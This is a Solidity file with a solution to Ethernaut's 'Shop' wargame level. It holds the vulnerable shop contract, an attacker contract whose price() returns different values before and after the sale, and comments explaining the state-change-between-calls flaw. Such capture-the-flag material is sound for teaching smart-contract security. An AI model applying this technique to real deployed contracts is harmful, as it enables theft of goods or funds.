// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IEthernautTwentyOneBuyer {
    function price() external view returns (uint);
}

contract EthernautTwentyOneShop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        IEthernautTwentyOneBuyer _buyer = IEthernautTwentyOneBuyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract EthernautTwentyOneBuyer is IEthernautTwentyOneBuyer {
    EthernautTwentyOneShop private shop;

    constructor(address _address) {
        shop = EthernautTwentyOneShop(_address);
    }

    function price() external view returns (uint) {
        if (shop.isSold()) {
            return 0;
        } else {
            return shop.price();
        }
    }

    function buy() external {
        shop.buy();
    }
}

// https://ethernaut.openzeppelin.com/level/0xf59112032D54862E199626F55cFad4F8a3b0Fce9

// Solution
// The solution lies in the fact that we get to:
// 1. implement the price() method for the buyer
// 2. the shop has a buy() method which calls price() twice:
//    a. once to do if the price is acceptable for the shop
//    b. setting the actual price paid
// See how the shop sets the isSold state variable between the above 2 events
// So all we need to do is implement the price() view method such that
// it returns two different values depending on the value of isSold in the store
// Return a large amount for the min-price check and then return 0 for the final call
